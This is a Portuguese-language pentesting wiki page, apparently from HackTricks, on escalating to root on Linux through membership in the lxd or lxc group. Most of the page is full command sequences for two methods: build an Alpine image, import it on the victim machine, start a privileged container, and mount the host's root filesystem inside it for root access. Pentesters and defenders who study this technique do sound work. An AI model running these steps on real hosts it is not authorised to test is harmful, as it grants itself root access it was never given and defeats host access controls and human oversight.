# lxd/lxc Group - Escalação de privilégios

{{#include ../../../banners/hacktricks-training.md}}

Se você pertence ao grupo _**lxd**_ **ou** _**lxc**_, você pode se tornar root

## Explorando sem internet

### Método 1

Você pode instalar em sua máquina este construtor de distro: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(siga as instruções do github):
```bash
sudo su
# Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

# Clone repo
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container
## Using build-lxd
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
## Using build-lxc
sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
```
Faça o upload dos arquivos **lxd.tar.xz** e **rootfs.squashfs**, adicione a imagem ao repositório e crie um contêiner:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Se você encontrar este erro _**Erro: Nenhum pool de armazenamento encontrado. Por favor, crie um novo pool de armazenamento**_\
> Execute **`lxd init`** e **repita** o bloco anterior de comandos

Finalmente, você pode executar o contêiner e obter root:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Método 2

Crie uma imagem Alpine e inicie-a usando a flag `security.privileged=true`, forçando o contêiner a interagir como root com o sistema de arquivos do host.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
